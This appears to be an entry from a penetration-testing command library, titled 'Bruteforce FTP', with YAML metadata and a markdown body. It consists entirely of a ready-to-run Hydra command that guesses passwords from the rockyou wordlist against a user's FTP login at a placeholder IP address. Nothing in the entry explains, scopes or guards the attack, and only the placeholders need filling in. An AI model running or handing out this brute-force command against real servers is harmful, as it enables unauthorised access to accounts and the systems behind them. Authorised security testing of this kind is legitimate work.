---
id: 3c3bc0fb-803f-4b09-9e7b-8ca4dad7c57c
name: Bruteforce FTP
type: command
executor: bash
data: 'hydra -t 1 -l $user -P /usr/share/wordlists/rockyou.txt -vV $ip ftp

  '
output: null
created_at: '2020-07-14T18:14:45.643781+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Bruteforce FTP

```bash
hydra -t 1 -l $user -P /usr/share/wordlists/rockyou.txt -vV $ip ftp

```


